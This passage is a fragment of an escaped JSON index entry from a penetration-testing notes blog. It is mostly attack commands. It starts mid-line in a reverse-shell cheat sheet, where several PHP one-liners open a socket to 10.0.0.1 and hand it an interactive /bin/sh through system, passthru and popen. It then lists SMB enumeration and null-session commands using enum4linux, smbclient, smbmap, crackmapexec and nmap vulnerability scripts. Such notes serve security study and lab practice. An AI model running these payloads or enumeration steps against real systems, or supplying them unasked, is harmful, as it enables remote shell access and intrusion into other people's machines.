\u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$sock=fsockopen(\u0026#34;10.0.0.1\u0026#34;,80);system(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$sock=fsockopen(\u0026#34;10.0.0.1\u0026#34;,80);passthru(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$sock=fsockopen(\u0026#34;10.0.0.1\u0026#34;,80);popen(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;, \u0026#34;r\u0026#34;);\u0026#39; ","permalink":"https://blog.allenxd.com/notes/","summary":"Samba What to do if samba port is open?\nCheck for usernames enum4linux -a 10.10.10.10 Smbclient smbclient -L //10.10.10.10 smbclient -L //10.10.10.10 -N No password (SMB Null session) smbclient --no-pass -L 10.10.10.10 smbclient //10.10.10.10/share_name nmap -script=smb-vuln\\* -p445 192.168.103.40 Smbmap smbmap -H 10.10.10.10 smbmap -H 10.10.10.10 -u '' -p '' smbmap -H 10.10.10.10 -s share_name CrackMapExec crackmapexec smb 10.10.10.10 -u '' -p '' --shares crackmapexec smb 10.10.10.10 -u 'sa' -p '' --shares crackmapexec smb 10.","title":"Notes"}]